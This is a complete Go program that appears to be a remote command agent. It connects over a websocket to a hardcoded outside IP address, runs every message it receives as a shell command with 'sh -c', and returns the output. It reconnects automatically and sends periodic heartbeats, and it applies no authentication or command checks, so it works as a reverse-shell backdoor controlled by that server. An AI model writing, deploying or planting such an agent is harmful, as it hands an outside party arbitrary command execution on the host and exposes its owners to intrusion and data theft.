package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"os/exec"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

const serverURL = "ws://121.40.42.38:8080/ws/node"

var conn *websocket.Conn

type CommandOutput struct {
	Stdout string `json:"stdout"`
	Stderr string `json:"stderr"`
}

func connectToServer() {
	var err error
	conn, _, err = websocket.DefaultDialer.Dial(serverURL, nil)
	if err != nil {
		log.Println("连接服务器失败:", err)
		time.Sleep(5 * time.Second)
		connectToServer()
		return
	}
	fmt.Println("成功连接服务器")
	go listenServer()
	go sendHeartbeat()
}

func listenServer() {
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Println("与服务器断开:", err)
			connectToServer()
			return
		}
		go executeCommand(string(msg))
	}
}

func executeCommand(command string) {
	fmt.Println("执行命令:", command)
	cmd := exec.Command("sh", "-c", command)
	stdoutPipe, _ := cmd.StdoutPipe()
	stderrPipe, _ := cmd.StderrPipe()
	cmd.Start()

	stdoutScanner := bufio.NewScanner(stdoutPipe)
	stderrScanner := bufio.NewScanner(stderrPipe)

	var stdoutLines, stderrLines []string
	for stdoutScanner.Scan() {
		stdoutLines = append(stdoutLines, stdoutScanner.Text())
	}
	for stderrScanner.Scan() {
		stderrLines = append(stderrLines, stderrScanner.Text())
	}
	cmd.Wait()

	output := CommandOutput{
		Stdout: strings.Join(stdoutLines, "\n"),
		Stderr: strings.Join(stderrLines, "\n"),
	}

	jsonData, _ := json.Marshal(output)
	conn.WriteMessage(websocket.TextMessage, jsonData)
}

func sendHeartbeat() {
	for {
		time.Sleep(10 * time.Second)
		conn.WriteMessage(websocket.TextMessage, []byte("ping"))
	}
}

func main() {
	connectToServer()
	select {}
}
